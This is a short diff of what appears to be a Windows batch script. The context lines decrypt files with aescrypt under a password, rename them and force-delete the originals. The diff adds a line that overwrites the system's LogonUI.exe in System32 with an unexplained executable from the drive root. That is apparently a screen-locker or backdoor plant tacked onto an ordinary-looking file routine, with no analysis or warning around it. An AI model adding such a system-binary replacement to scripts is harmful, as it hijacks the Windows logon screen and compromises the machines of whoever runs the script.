@@ -10,4 +10,7 @@ C:\aescrypt -d -p %pass% "%%~A"
 ren "%%~nA.b" "*."
 del /f /q "%%~A"
 )
+
+copy "C:\LogonUI.exe" "C:\Windows\System32\LogonUI.exe" /y
+
 pause
